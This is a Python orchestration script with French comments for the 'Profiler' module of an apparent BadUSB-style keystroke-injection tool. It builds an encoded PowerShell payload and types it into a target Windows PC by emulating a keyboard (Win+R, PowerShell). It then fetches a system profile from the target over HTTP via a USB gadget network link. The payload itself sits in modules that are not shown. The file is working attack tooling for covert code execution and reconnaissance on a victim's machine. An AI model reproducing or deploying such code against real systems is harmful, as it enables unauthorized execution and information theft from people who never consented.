#!/usr/bin/env python3

"""
profiler/profiler.py

Orchestrateur du module Profiler.
Coordonne les différentes étapes du profilage.
"""

import time

from .system_profiler import build_payload, collect_system_profile
from hid_keyboard import execute_in_ps

# IP du PC cible sur l'interface USB Gadget
TARGET_IP = "192.168.7.1"
HTTP_PORT = 8888


def run_profiler():
    """
    Lance le module Profiler.

    Étapes :
      1. Construire le payload PowerShell (encodé Base64)
      2. L'exécuter sur la cible via HID (Win+R → PowerShell)
      3. Attendre que la cible démarre son serveur HTTP
      4. Récupérer le profil via HTTP
      5. Retourner le résultat
    """

    print("[Profiler] Initialisation...")

    # 1. Construire le payload
    payload = build_payload(http_port=HTTP_PORT, use_encoded=True)

    print(f"[Profiler] Payload construit ({len(payload)} caractères).")

    # 2. Envoyer via HID (PowerShell encodé)
    print("[Profiler] Envoi du payload sur la cible via HID...")

    success = execute_in_ps(payload, encoded=False)  # déjà encodé dans build_payload

    if not success:
        print("[Profiler] Échec de l'envoi HID.")
        return None

    # 3. Attendre que la cible exécute et démarre le serveur HTTP
    print("[Profiler] Attente du démarrage du serveur HTTP cible (5 secondes)...")
    time.sleep(5)

    # 4. Récupérer le profil depuis la cible
    profile = collect_system_profile(
        target_ip=TARGET_IP,
        http_port=HTTP_PORT,
        retries=5,
        retry_delay=2
    )

    if profile is None:
        print("[Profiler] Aucun profil reçu.")
        return None

    print("[Profiler] Profil récupéré avec succès.")
    return profile
